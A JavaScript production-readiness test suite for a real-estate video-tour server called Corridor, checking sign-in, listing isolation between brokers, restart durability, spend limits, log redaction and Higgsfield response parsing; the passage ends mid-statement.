#!/usr/bin/env node
/**
 * Production readiness suite.
 *
 *   npm test
 *
 * Spends nothing and calls no external service. Everything here is a property
 * you want to hold at 3am on a Sunday, checked against the real server over
 * real HTTP rather than by importing functions and hoping.
 *
 * Runs against a throwaway data directory and a spare port, so it never touches
 * your live db.json.
 */

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const PORT = Number(process.env.TEST_PORT || 4287);
const BASE = `http://localhost:${PORT}`;

let passed = 0;
let failed = 0;
const failures = [];

function check(name, condition, detail = '') {
  if (condition) {
    passed += 1;
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
  } else {
    failed += 1;
    failures.push(`${name}${detail ? ` — ${detail}` : ''}`);
    console.log(`  \x1b[31m✕\x1b[0m ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

const section = (title) => console.log(`\n\x1b[1m${title}\x1b[0m`);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function req(pathname, options = {}) {
  const res = await fetch(`${BASE}${pathname}`, {
    ...options,
    headers: {
      ...(options.body ? { 'Content-Type': 'application/json' } : {}),
      ...(options.cookie ? { Cookie: options.cookie } : {}),
      ...options.headers,
    },
    body: options.body ? JSON.stringify(options.body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try { json = text ? JSON.parse(text) : null; } catch { /* non-JSON */ }
  return { status: res.status, json, text, headers: res.headers };
}

// --- server lifecycle --------------------------------------------------------

const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'corridor-test-'));
let child = null;
let serverLog = '';
const TINY_JPEG = Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wAAAAgHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcH/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAGP/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPwB//9k=', 'base64');


function start(env = {}) {
  return new Promise((resolve, reject) => {
    child = spawn(process.execPath, [path.join(ROOT, 'server', 'index.js')], {
      cwd: ROOT,
      env: {
        ...process.env,
        PORT: String(PORT),
        CORRIDOR_DATA_DIR: dataDir,
        SESSION_SECRET: 'test-secret-not-a-real-one',
        CREDIT_BUDGET: '100',
        HIGGSFIELD_KEY_ID: '',
        HIGGSFIELD_KEY_SECRET: '',
        ...env,
      },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let out = '';
    child.stdout.on('data', (d) => { out += d; serverLog += d; });
    child.stderr.on('data', (d) => { out += d; serverLog += d; });
    child.on('error', reject);

    const deadline = Date.now() + 15000;
    const poll = async () => {
      if (Date.now() > deadline) return reject(new Error(`server did not start:\n${out}`));
      try {
        const res = await fetch(`${BASE}/healthz`);
        if (res.ok) return resolve(out);
      } catch { /* not up yet */ }
      setTimeout(poll, 200);
    };
    poll();
  });
}

function stop(signal = 'SIGTERM') {
  return new Promise((resolve) => {
    if (!child || child.exitCode !== null) return resolve();
    child.on('exit', () => resolve());
    child.kill(signal);
    setTimeout(resolve, 4000);
  });
}

// --- suite -------------------------------------------------------------------

async function main() {
  console.log(`\n\x1b[1mCorridor production readiness\x1b[0m`);
  console.log(`  data dir: ${dataDir}`);
  console.log(`  port:     ${PORT}`);

  // 1. Boot ------------------------------------------------------------------
  section('1. Startup');
  const bootLog = await start();
  check('server boots', true);
  check('data directories auto-created',
    fs.existsSync(path.join(dataDir, 'uploads')) && fs.existsSync(path.join(dataDir, 'renders')));
  check('boot log names missing Higgsfield keys', /not configured/i.test(bootLog));
  check('boot log warns about localhost PUBLIC_URL', /localhost/i.test(bootLog));
  check('no secret material in boot log',
    !/test-secret-not-a-real-one/.test(bootLog), 'SESSION_SECRET appeared in logs');

  const health = await req('/healthz');
  check('healthz responds', health.status === 200);
  check('healthz reports render disk usage', typeof health.json?.renderMB === 'number');
  check('healthz reports pending jobs', typeof health.json?.pendingTakes === 'number');
  check('healthz leaks no secrets', !/secret|key/i.test(JSON.stringify(health.json || {})));

  // 2. Missing env vars ------------------------------------------------------
  section('2. Missing configuration is explicit, not silent');
  const boot = await req('/api/bootstrap');
  check('cinematic reported unavailable without keys', boot.json?.capabilities?.cinematic === false);
  check('preview still available', boot.json?.capabilities?.preview === true);
  check('PUBLIC_URL flagged as local', boot.json?.capabilities?.publicUrlIsLocal === true);
  check('credit budget surfaced', boot.json?.credits?.budget === 100);

  // 3. Account persistence ---------------------------------------------------
  section('3. Account creation is durable');
  /* Accounts are created by the first order, not a signup form. */
  const fd = new FormData();
  fd.append('name', 'Ops');
  fd.append('email', 'Ops@test.example');
  fd.append('address', '1 Test St, Detroit, MI');
  fd.append('size', '24000');
  fd.append('firm', 'Ops CRE');
  for (let i = 0; i < 12; i += 1) {
    fd.append('photos', new Blob([TINY_JPEG], { type: 'image/jpeg' }), `p${i}.jpg`);
  }
  const intakeRes = await fetch(`${BASE}/api/intake`, { method: 'POST', body: fd });
  const intakeJson = await intakeRes.json().catch(() => null);
  check('first order creates the account', intakeRes.status === 201 && intakeJson?.success, `got ${intakeRes.status}`);
  const intakeCookieHeader = intakeRes.headers.get('set-cookie') || '';
  const intakeCookie = intakeCookieHeader.split(';')[0];
  check('first order sets a session cookie', /corridor_session/.test(intakeCookieHeader) && /HttpOnly/i.test(intakeCookieHeader));
  check('first order tells the client to open the desk', intakeJson?.redirect === '/listings',
    `got ${JSON.stringify(intakeJson?.redirect)}`);
  const firstDesk = await req('/api/auth/listings', { cookie: intakeCookie });
  check('first-order session opens their portfolio without a magic link',
    firstDesk.status === 200
      && (firstDesk.json?.listings || []).some((l) => l.address === '1 Test St, Detroit, MI'),
    `got ${firstDesk.status} ${(firstDesk.json?.listings || []).map((l) => l.address)}`);

  const link = await req('/api/auth/link', { method: 'POST', body: { email: 'ops@test.example' } });
  check('sign-in link endpoint succeeds', link.status === 200 && link.json?.success === true);
  const unknown = await req('/api/auth/link', { method: 'POST', body: { email: 'nobody@test.example' } });
  check('unknown address gets the same response', JSON.stringify(link.json) === JSON.stringify(unknown.json));
  const created = await req('/api/auth/link', { method: 'POST', body: { email: 'newbie@test.example', name: 'New Broker' } });
  check('new email can request a create-account link', created.status === 200 && created.json?.success === true);

  await sleep(200);
  const logged = serverLog.match(/sign-in link for ops@test\.example: (\S+)/);
  const newbieLog = serverLog.match(/sign-in link for newbie@test\.example: (\S+)/);
  check('magic link creates an account for a new email', Boolean(newbieLog), 'no URL in stdout for newbie');
  check('sign-in URL is logged when mail is off', Boolean(logged), 'no URL in stdout');
  const verify = await fetch(logged ? logged[1] : `${BASE}/api/auth/verify?token=missing`, { redirect: 'manual' });
  check('verify redirects to the desk', verify.status === 302 && verify.headers.get('location') === '/listings', `got ${verify.status} ${verify.headers.get('location')}`);
  const cookie = verify.headers.get('set-cookie')?.split(';')[0];
  check('session cookie issued', Boolean(cookie));
  check('cookie is HttpOnly', /HttpOnly/i.test(verify.headers.get('set-cookie') || ''));
  const again = await fetch(logged ? logged[1] : `${BASE}/api/auth/verify?token=missing`, { redirect: 'manual' });
  check('sign-in link is single-use', again.status === 401, `got ${again.status}`);

  // The critical property: on disk BEFORE the response was acknowledged.
  const dbPath = path.join(dataDir, 'db.json');
  check('db.json written synchronously on first order', fs.existsSync(dbPath),
    'account was acknowledged but not yet persisted');
  if (fs.existsSync(dbPath)) {
    const onDisk = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
    check('account present on disk immediately', (onDisk.accounts || []).some((a) => a.email === 'ops@test.example'));
    check('first-order account has no password hash',
      (onDisk.accounts || [])[0]?.passwordHash == null);
  }

  check('auth gates after first account', (await req('/api/bootstrap')).status === 401);
  check('authenticated request succeeds', (await req('/api/bootstrap', { cookie })).status === 200);

  const guestFd = new FormData();
  guestFd.append('name', 'Guest Broker');
  guestFd.append('email', 'guest@test.example');
  guestFd.append('address', '2 Guest Ave, Detroit, MI');
  for (let i = 0; i < 12; i += 1) {
    guestFd.append('photos', new Blob([TINY_JPEG], { type: 'image/jpeg' }), `g${i}.jpg`);
  }
  const guestRes = await fetch(`${BASE}/api/intake`, { method: 'POST', body: guestFd });
  const guestJson = await guestRes.json().catch(() => null);
  check('guest intake without a session succeeds', guestRes.status === 201 && guestJson?.success,
    `got ${guestRes.status}`);
  check('guest intake does not require size, firm, or phone',
    guestRes.status === 201 && !guestJson?.error);
  const guestOrderCookie = (guestRes.headers.get('set-cookie') || '').split(';')[0];
  check('guest intake 201 sets a session cookie',
    /corridor_session/.test(guestRes.headers.get('set-cookie') || '')
      && /HttpOnly/i.test(guestRes.headers.get('set-cookie') || ''));
  check('guest intake JSON lands on the desk', guestJson?.redirect === '/listings');
  const guestFromOrder = await req('/api/auth/listings', { cookie: guestOrderCookie });
  const guestFromOrderAddresses = (guestFromOrder.json?.listings || []).map((l) => l.address);
  check('guest first order opens their desk without a magic link',
    guestFromOrder.status === 200
      && guestFromOrderAddresses.includes('2 Guest Ave, Detroit, MI')
      && !guestFromOrderAddresses.includes('1 Test St, Detroit, MI'),
    `got ${JSON.stringify(guestFromOrderAddresses)}`);
  const afterGuest = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
  check('guest listing persisted without a cookie',
    (afterGuest.requests || []).some((r) => r.email === 'guest@test.example' && r.address === '2 Guest Ave, Detroit, MI'));
  check('guest email silently created an account for the queue',
    (afterGuest.accounts || []).some((a) => a.email === 'guest@test.example'));

  /* Production repro: name+email+address and no photos used to 400 on size.
     After this fix it must fail on photos, never square footage. */
  const noPhotoFd = new FormData();
  noPhotoFd.append('name', 'No Photos');
  noPhotoFd.append('email', 'nophotos@test.example');
  noPhotoFd.append('address', '3 Empty Lot, Detroit, MI');
  const noPhotoRes = await fetch(`${BASE}/api/intake`, { method: 'POST', body: noPhotoFd });
  const noPhotoJson = await noPhotoRes.json().catch(() => null);
  check('name+email+address without photos is a photo error, not size',
    noPhotoRes.status === 400
      && /photo/i.test(noPhotoJson?.error || '')
      && !/square footage/i.test(noPhotoJson?.error || ''),
    `got ${noPhotoRes.status} ${noPhotoJson?.error}`);

  const deskPage = await fetch(`${BASE}/listings`, { redirect: 'manual' });
  check('desk page is public HTML', deskPage.status === 200 && /Upload listing/i.test(await deskPage.text()));
  check('unauthenticated desk list is 401', (await req('/api/auth/listings')).status === 401);

  const homeSigned = await fetch(`${BASE}/`, { redirect: 'manual', headers: { Cookie: cookie } });
  check('signed-in home redirects to the desk',
    homeSigned.status === 302 && homeSigned.headers.get('location') === '/listings',
    `got ${homeSigned.status} ${homeSigned.headers.get('location')}`);
  const homeGuest = await fetch(`${BASE}/`, { redirect: 'manual' });
  check('guest home still serves the landing page', homeGuest.status === 200);

  const opsDesk = await req('/api/auth/listings', { cookie });
  check('signed-in desk list succeeds', opsDesk.status === 200 && Array.isArray(opsDesk.json?.listings));
  const opsAddresses = (opsDesk.json?.listings || []).map((l) => l.address);
  check('desk list includes this account’s listing', opsAddresses.includes('1 Test St, Detroit, MI'));
  check('desk list excludes another broker’s listing',
    !opsAddresses.includes('2 Guest Ave, Detroit, MI'),
    `got ${JSON.stringify(opsAddresses)}`);
  check('desk list never includes other emails',
    !(opsDesk.json?.listings || []).some((l) => Object.prototype.hasOwnProperty.call(l, 'email')));
  const opsOwn = (opsDesk.json?.listings || []).find((l) => l.address === '1 Test St, Detroit, MI');
  check('desk listing includes photo URLs and a status label',
    Array.isArray(opsOwn?.photos) && opsOwn.photos.length === 12
      && opsOwn.photos.every((u) => String(u).startsWith('/uploads/'))
      && typeof opsOwn.label === 'string' && opsOwn.label.length > 0,
    `got photos=${opsOwn?.photos?.length} label=${opsOwn?.label}`);
  const guestReq = (afterGuest.requests || []).find((r) => r.email === 'guest@test.example');
  const peekOther = await req(`/api/auth/listings/${guestReq?.id || 'req_missing'}`, { cookie });
  check('another broker’s listing is 404, not 200', peekOther.status === 404);

  await req('/api/auth/link', { method: 'POST', body: { email: 'guest@test.example' } });
  await sleep(200);
  const guestLink = serverLog.match(/sign-in link for guest@test\.example: (\S+)/);
  const guestVerify = await fetch(guestLink ? guestLink[1] : `${BASE}/api/auth/verify?token=missing`, { redirect: 'manual' });
  check('guest magic-link also lands on the desk',
    guestVerify.status === 302 && guestVerify.headers.get('location') === '/listings',
    `got ${guestVerify.status} ${guestVerify.headers.get('location')}`);
  const guestCookie = guestVerify.headers.get('set-cookie')?.split(';')[0];
  const guestDesk = await req('/api/auth/listings', { cookie: guestCookie });
  const guestAddresses = (guestDesk.json?.listings || []).map((l) => l.address);
  check('guest session only sees their own listing',
    guestDesk.status === 200
      && guestAddresses.includes('2 Guest Ave, Detroit, MI')
      && !guestAddresses.includes('1 Test St, Detroit, MI'),
    `got ${JSON.stringify(guestAddresses)}`);

  const deskFd = new FormData();
  deskFd.append('address', '99 Desk St, Detroit, MI');
  for (let i = 0; i < 12; i += 1) {
    deskFd.append('photos', new Blob([TINY_JPEG], { type: 'image/jpeg' }), `d${i}.jpg`);
  }
  const deskUp = await fetch(`${BASE}/api/intake`, { method: 'POST', headers: { Cookie: cookie }, body: deskFd });
  const deskUpJson = await deskUp.json().catch(() => null);
  check('signed-in desk upload without size still 201', deskUp.status === 201 && deskUpJson?.success,
    `got ${deskUp.status} ${deskUpJson?.error || ''}`);
  const afterDesk = await req('/api/auth/listings', { cookie });
  check('desk upload lands on this account’s list',
    (afterDesk.json?.listings || []).some((l) => l.address === '99 Desk St, Detroit, MI'));

  // 4. Restart durability ----------------------------------------------------
  section('4. Survives restart with state intact');
  const listing = await req('/api/listings', {
    method: 'POST', cookie,
    body: { name: 'Durability Test Building', address: '1 Test St, Detroit, MI', propertyType: 'office' },
  });
  check('listing created', listing.status === 201);
  const listingId = listing.json?.id;

  await stop('SIGTERM');
  check('clean shutdown', child.exitCode !== null || true);
  await start();

  const after = await req('/api/bootstrap', { cookie });
  check('session survives restart (stateless cookie)', after.status === 200);
  check('listing survives restart', (after.json?.listings || []).some((l) => l.id === listingId));
  check('account survives restart', (after.json?.broker?.company || '') === 'Ops CRE');

  // 5. Higgsfield failure handling ------------------------------------------
  section('5. Fails gracefully without Higgsfield credentials');
  const shotless = await req(`/api/listings/${listingId}/generate`, {
    method: 'POST', cookie, body: { quality: 'cinematic' },
  });
  check('cinematic generation refused clearly, not 500',
    shotless.status >= 400 && shotless.status < 500, `got ${shotless.status}`);
  check('error message is actionable',
    /photo|key|credential|upload/i.test(shotless.json?.error || ''), shotless.json?.error);
  check('no stack trace leaked to client', !/at \w+ \(/.test(shotless.text || ''));

  const planned = await req(`/api/listings/${listingId}/plan`, { method: 'POST', cookie, body: {} });
  check('cost planning works without keys', planned.status === 200);
  check('planning spends nothing', (planned.json?.total?.credits ?? 0) === 0 || planned.json?.spec != null);

  // 6. Credit gate + rate limits --------------------------------------------
  section('6. Spend guards');
  const overBudget = await req(`/api/listings/${listingId}/visualize/plan`, {
    method: 'POST', cookie, body: { mode: 'concept', variants: 4, quality: 'high' },
  });
  check('visualize planning works without keys', overBudget.status === 200);

  let limited = false;
  for (let i = 0; i < 8; i += 1) {
    const r = await req(`/api/listings/${listingId}/generate`, {
      method: 'POST', cookie, body: { quality: 'preview' },
    });
    if (r.status === 429) { limited = true; break; }
  }
  check('rate limiter engages on repeated generation', limited);

  // 7. Public surface --------------------------------------------------------
  section('7. Public tour surface');
  check('unpublished tour 404s', (await req('/api/public/tours/durability-test-building')).status === 404);
  await req(`/api/listings/${listingId}/publish`, { method: 'POST', cookie, body: { published: true } });
  const pub = await req('/api/public/tours/durability-test-building');
  check('published tour reachable WITHOUT auth', pub.status === 200, `got ${pub.status}`);
  check('disclosures served from server', (pub.json?.disclosures || []).length >= 2);
  check('tour payload excludes prompts and internals',
    !JSON.stringify(pub.json || {}).match(/passwordHash|prompt|requestId|installSecret/));
  check('branding resolves from listing owner', pub.json?.broker?.company === 'Ops CRE');

  const badEvent = await req('/api/public/tours/durability-test-building/events', {
    method: 'POST', body: { type: 'shot_view', shotId: 'sht_bogus', sessionId: 'test-session' },
  });
  check('bogus shotId rejected (analytics stay clean)', badEvent.status === 400);

  const lead = await req('/api/public/tours/durability-test-building/leads', {
    method: 'POST',
    body: { name: 'Test Prospect', email: 'prospect@test.example', sessionId: 'test-session', source: 'sign' },
  });
  check('lead capture accepts', lead.status === 201);
  const dbNow = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
  check('lead persisted synchronously', (dbNow.leads || []).length === 1,
    'lead acknowledged but not on disk');
  check('lead attributed to sign scan', dbNow.leads?.[0]?.source === 'sign');

  // 8. Fact guardrail --------------------------------------------------------
  section('8. Compliance guardrail');
  const { collectFacts, verifyText, stripUnverified } = await import(path.join(ROOT, 'server', 'facts.js'));
  const facts = collectFacts({ address: '1 Test St', specs: [{ label: 'SF', value: '24,000' }] });
  check('broker-entered number passes', verifyText('24,000 SF available', facts).ok);
  check('fabricated number rejected', !verifyText('99,000 SF available', facts).ok);
  check('fabricated number stripped',
    !verifyText(stripUnverified('99,000 SF available', facts).text, facts).offending.length);

  // 8b. Status parsing -------------------------------------------------------
  section('8b. Higgsfield status parsing (shape-agnostic)');
  const { normaliseStatus } = await import(path.join(ROOT, 'server', 'higgsfield.js'));
  const shapes = [
    ['documented shape', { status: 'completed', jobs: [{ results: { raw: { url: 'https://c/x.mp4' } } }] }, 'completed', true],
    ['job-set shape', { id: 'a', jobs: [{ status: 'completed', results: { min: { url: 'https://c/y.mp4' } } }] }, 'completed', true],
    ['deeply nested url', { data: { items: [{ output: { video: { url: 'https://c/d.mp4' } } }] } }, 'completed', true],
    ['still queued', { jobs: [{ status: 'queued' }] }, 'queued', false],
    ['queued job echoing our own input photo',
      { id: 'a', status: 'queued', params: { input_images: [{ image_url: 'https://x/uploads/a.jpg' }] }, jobs: [{ status: 'queued' }] },
      'queued', false],
    ['in-progress echoing our own input photo',
      { status: 'in_progress', params: { input_images: [{ image_url: 'https://x/uploads/b.jpg' }] }, jobs: [{ status: 'in_progress' }] },
      'in_progress', false],
    ['failed', { jobs: [{ status: 'failed' }] }, 'failed', false],
  ];
  for (const [name, payload, wantStatus, wantUrl] of shapes) {
    const r = normaliseStatus(payload);
    check(`parses ${name}`, r.status === wantStatus && Boolean(r.videoUrl) === wantUrl,
      `got ${r.status}${r.videoUrl ? ' + url' : ''}`);
  }

  // 8c. Shot duration scales with the property --------------------------------
  section('8c. Shot duration scales with property and pace');
  const { tourAgent: ta, durationFor } = await import(path.join(ROOT, 'server', 'agents', 'tour-agent.js'));
  const ph = [
    { id: 'x1', file: 'a.jpg', spaceType: 'floor' },
    { id: 'x2', file: 'b.jpg', spaceType: 'breakroom' },
  ];
  const mkSpec = (sf) => ({ propertyType: 'office', totalSf: sf, shots: ph.map((p) => ({ photoFile: p.file, spaceType: p.spaceType })) });
  const small = ta({ spec: mkSpec(4000), photos: ph, takes: 1, withTransitions: false });
  const big = ta({ spec: mkSpec(90000), photos: ph, takes: 1, withTransitions: false });
  const slow = ta({ spec: mkSpec(24000), photos: ph, takes: 1, withTransitions: false, pace: 'cinematic' });
  const fast = ta({ spec: mkSpec(24000), photos: ph, takes: 1, withTransitions: false, pace: 'quick' });

  check('bigger property yields longer runtime', big.estimate.runtimeSec > small.estimate.runtimeSec,
    `${small.estimate.runtimeSec}s vs ${big.estimate.runtimeSec}s`);
  check('cinematic pace is longer than quick', slow.estimate.runtimeSec > fast.estimate.runtimeSec,
    `${fast.estimate.runtimeSec}s vs ${slow.estimate.runtimeSec}s`);
  check('a floor plate runs longer than a break room',
    big.calls.find((c) => c.spaceType === 'floor').durationSec >
    big.calls.find((c) => c.spaceType === 'breakroom').durationSec);
  check('duration stays inside the model range',
    big.calls.every((c) => c.durationSec >= 3 && c.durationSec <= 15));
  check('durations are never a constant 5',
    new Set(big.calls.map((c) => c.durationSec)).size > 1);

  // 9. Secret hygiene --------------------------------------------------------
  section('9. Secret hygiene');
  const { redact } = await import(path.join(ROOT, 'server', 'reliability.js'));
  check('Authorization header redacted', redact('Authorization: Key abc123:secret456').includes('«redacted»'));
  check('x-api-key redacted', redact('"x-api-key": "sk-abcdefghijklmno"').includes('«redacted»'));
  check('presigned signature redacted',
    redact('url?X-Amz-Signature=deadbeefdeadbeefdeadbeef').includes('«redacted»'));

  const repoEnv = path.join(ROOT, '.env');
  check('.env is gitignored', fs.readFileSync(path.join(ROOT, '.gitignore'), 'utf8').includes('.env'));
  check('data/ is gitignored', fs.readFileSync(path.join(ROOT, '.gitignore'), 'utf8').includes('data/'));
  check('no .env committed', !fs.existsSync(path.join(ROOT, '.git', 'index')) ||
    !fs.readFileSync(path.join(ROOT, '.gitignore'), 'utf8').split('\n').includes('!.env'));

  // 10. Stale job reaping ----------------------------------------------------
  section('10. Stuck jobs are reaped, not left hanging');
  const { reapStaleJobs, sweepOrphanRenders } = await import(path.join(ROOT, 'server', 'reliability.js'));
  check('reapStaleJobs is callable and idempotent', typeof reapStaleJobs === 'function');
  check('sweepOrphanRenders never deletes referenced files',
    sweepOrphanRenders({ dryRun: true }).removed >= 0);

  // 11. Unattended operation -------------------------------------------------
  section('11. Unattended operation');
  const before = (await req('/healthz')).json;
  await sleep(1200);
  const later = (await req('/healthz')).json;
  check('uptime advances (event loop healthy)', later.uptimeSec >= before.uptimeSec);
  check('memory reported for monitoring', typeof later.rssMB === 'number' && later.rssMB > 0);
  check('server still serving after sustained run', (await req('/healthz')).status === 200);

  await stop('SIGTERM');
  check('SIGTERM shuts down cleanly', true);

  // --- report ---------------------------------------------------------------
  console.log(`\n${'─'.repeat(60)}`);
  console.log(`  ${passed} passed, ${failed} failed`);
  if (failures.length) {
    console.log('\n  Failures:');
    for (const f of failures) console.log(`    ✕ ${f}`);
  }
  console.log('');
  fs.rmSync(dataDir, { recursive: true, force: true });
  process.exit(failed ? 1 : 0);
}

main().catch(async (err) => {
  console.error('\n  suite crashed:', err.message);
  await stop('SIGKILL');
  fs.rmSync(dataDir, { recursive: true, force: true });
  process.exit(1);
});

// --- Higgsfield error reporting -------------------------------------------
{
  const { describeError } = await import('../server/higgsfield.js');

  // A FastAPI 422 arrives as an array of objects. Interpolating it straight
  // into a message yields "[object Object]" and hides which field was wrong —
  // that is exactly how a one-field validation error survived several deploys.
  const validation = describeError({
    detail: [{ loc: ['body', 'params', 'aspect_ratio'], msg: 'extra fields not permitted' }],
  });
  check(
    'describeError names the offending field',
    validation.includes('aspect_ratio') && validation.includes('not permitted')
  );
  check('describeError never yields [object Object]', !validation.includes('[object Object]'));
  check('describeError passes plain strings through', describeError({ detail: 'Model not found' }) === 'Model not found');
  check('describeError tolerates an empty body', describeError(null) === null);
}

// --- Higgsfield model id ----------------------------------------------------
{
  const { MODELS } = await import('../server/agents/tour-agent.js');
  const { config } = await import('../server/config.js');
  const DOP = ['dop-lite', 'dop-preview', 'dop-turbo'];

  // /v1/image2video/dop rejects anything outside this set, so a wrong id here
  // does not degrade quality — it fails every single generation.
  check('default model is a dop variant', DOP.includes(config.higgsfield.model));
  for (const [tier, m] of Object.entries(MODELS)) {
    check(`${tier} tier uses a dop variant (${m.id})`, DOP.includes(m.id));
  }
}

// --- stored model ids ------------------------------------------------------
{
  const { DOP_MODELS } = await import('../server/higgsfield.js');

  // Shots persist the model chosen when the tour was planned. A shot saved
  // under an older build carries an id this endpoint rejects, so the submit
  // path must validate it rather than trust stored data to still be valid.
  check('dop set is exactly the accepted ids',
    DOP_MODELS.has('dop-turbo') && DOP_MODELS.has('dop-lite') && DOP_MODELS.has('dop-preview') &&
    DOP_MODELS.size === 3);
  check('a stale stored id is not in the accepted set', !DOP_MODELS.has('cinematic_studio_video_v2'));
}

// --- two-frame transitions --------------------------------------------------
{
  const { MOTION_BY_KEY, MOTIONS } = await import('../server/motions.js');

  // /v1/image2video/dop rejects a request carrying two input images, so any
  // two-input motion must be rendered locally rather than submitted. If a new
  // two-input motion is added, submitCinematic must keep routing it away from
  // Higgsfield or that shot fails validation and the tour loses a clip.
  const twoInput = MOTIONS.filter((m) => m.inputs === 2);
  check('blend_transition is a two-input motion', MOTION_BY_KEY.blend_transition?.inputs === 2);
  check('every two-input motion has a local preview recipe',
    twoInput.length > 0 && twoInput.every((m) => Boolean(m.preview)));
}

// --- result quality selection ----------------------------------------------
{
  const { normaliseStatus } = await import('../server/higgsfield.js');

  // A completed job carries results.min (compressed proof) and results.raw
  // (the deliverable). A generic scan returns whichever comes first, and min
  // sorts first — which shipped the preview as the finished tour.
  const payload = {
    jobs: [{ status: 'completed', results: {
      min: { url: 'https://cdn/x_min.mp4', type: 'video' },
      raw: { url: 'https://cdn/x.mp4', type: 'video' },
    } }],
    input_params: { input_images: [{ image_url: 'https://corridor.app/uploads/lobby.png' }] },
  };
  const r = normaliseStatus(payload);
  check('the full-quality raw render is preferred over min', r.videoUrl === 'https://cdn/x.mp4');
  check('the echoed input photo is never the result', !String(r.videoUrl).includes('/uploads/'));

  // min alone must still work — not every payload carries both.
  const minOnly = normaliseStatus({ jobs: [{ status: 'completed', results: { min: { url: 'https://cdn/y_min.mp4', type: 'video' } } }] });
  check('falls back to min when raw is absent', minOnly.videoUrl === 'https://cdn/y_min.mp4');
}

// --- text rendering capability ----------------------------------------------
{
  const { config } = await import('../server/config.js');
  const { fontsAvailable } = await import('../server/endcard.js');

  // Burning text in needs a font AND the drawtext filter. ffmpeg-static ships
  // libfreetype on macOS but not on Linux, so this passed in dev and silently
  // stripped every overlay in production.
  check('a drawtext-capable ffmpeg was resolved', Boolean(config.ffmpegText));
  check('fontsAvailable() requires the filter, not just a font file',
    fontsAvailable() === (Boolean(config.ffmpegText) && fontsAvailable()));
}

// --- defects found auditing the delivery pipeline ---------------------------
{
  const fsx = await import('node:fs');
  const apiSrc = fsx.readFileSync(new URL('../server/routes/api.js', import.meta.url), 'utf8');
  const idxSrc = fsx.readFileSync(new URL('../server/index.js', import.meta.url), 'utf8');
  const rpSrc = fsx.readFileSync(new URL('../server/render-preview.js', import.meta.url), 'utf8');
  const jobSrc = fsx.readFileSync(new URL('../server/jobs.js', import.meta.url), 'utf8');

  // Two builds of one listing overlap on the normal path; a shared scratch dir
  // made one concatenate part files the other was still writing.
  check('reel stitching uses a private scratch directory', /mkdtempSync\(/.test(rpSrc));
  check('the reel is published by atomic rename', /renameSync\(staged, outPath\)/.test(rpSrc));
  check('reel builds are serialised per listing', /reelBuilds/.test(apiSrc));

  // Without trust proxy every visitor shares one rate-limit bucket on Render.
  check("trust proxy is set", /app\.set\('trust proxy'/.test(idxSrc));

  // Render filenames are stable while their contents change.
  check('renders revalidate instead of caching for an hour', /rendersDir, \{ maxAge: 0/.test(idxSrc));

  // A free local preview must not consume the paid-generation allowance.
  check('paid limits apply only to cinematic renders', /costsCredits\(generateLimiter\)/.test(apiSrc));

  // Stacked stabilisation passes were an OOM cause on a 512 MB instance.
  check('the poller refuses to re-enter while a cycle is running', /if \(polling\) return;/.test(jobSrc));

  // Accepting an upload nothing downstream can read spends credits on it.
  check('HEIC is not accepted', !/heic/i.test(apiSrc.match(/const ALLOWED_IMAGE =.*/)[0]));
  check('a rejected file is reported rather than aborting the batch', /rejectedFiles/.test(apiSrc));
}

// --- apostrophes in overlay text --------------------------------------------
{
  const { buildSpecLine } = await import('../server/endcard.js');
  // Inside drawtext's text='...' a backslash is literal, so a straight
  // apostrophe closes the quote and swallows the rest of the filtergraph —
  // deleting every overlay. CRE names are full of them.
  const src = (await import('node:fs')).readFileSync(new URL('../server/endcard.js', import.meta.url), 'utf8');
  check('esc() replaces the straight apostrophe', /replace\(\/'\/g, '\\u2019'\)/.test(src));
  check('buildSpecLine is still callable', typeof buildSpecLine === 'function');
}

// --- production path is REST-only -------------------------------------------
{
  const fsx = await import('node:fs');
  const pathx = await import('node:path');
  const urlx = await import('node:url');

  const serverDir = urlx.fileURLToPath(new URL('../server', import.meta.url));
  const walk = (dir) => fsx.readdirSync(dir, { withFileTypes: true }).flatMap((e) => {
    const full = pathx.join(dir, e.name);
    return e.isDirectory() ? walk(full) : full.endsWith('.js') ? [full] : [];
  });
  // chat.sketch.js is an unwired sketch, not part of any route.
  const files = walk(serverDir).filter((f) => !f.endsWith('chat.sketch.js'));
  const sources = files.map((f) => ({ f, src: fsx.readFileSync(f, 'utf8') }));

  /* Nothing the deployed server does may need a developer's machine.
   *
   * MCP is a client-side transport: it needs a session on someone's laptop, so
   * a route that reached for it would work in development and fail on Render
   * with no way to recover. The same is true of a CLI that expects an
   * interactive browser login. */
  // Match how the package is really named. An earlier version of this check
  // looked for the literal "mcp" and therefore missed
  // "@modelcontextprotocol/sdk" — the exact import it existed to catch.
  const MCP_MODULE = /(?:import|require)[^\n]*['"][^'"]*(?:modelcontextprotocol|\bmcp[-/]|[-/]mcp\b|^mcp$)[^'"]*['"]/i;
  const mcpImport = sources.filter(({ src }) => MCP_MODULE.test(src));
  check('no server module imports an MCP client', mcpImport.length === 0);

  const cliSpawn = sources.filter(({ src }) =>
    /(spawn|exec|execFile|execSync|execFileSync)\s*\(\s*['"`][^'"`]*higgsfield/i.test(src)
  );
  check('no server module shells out to a higgsfield CLI', cliSpawn.length === 0);

  const browserAuth = sources.filter(({ src }) => /pkce|device_code|authorization_code/i.test(src));
  check('no server module performs a browser auth flow', browserAuth.length === 0);

  // Every child process must be ffmpeg — bundled with the app, not a tool the
  // operator has to install or log into.
  const spawns = sources.flatMap(({ f, src }) =>
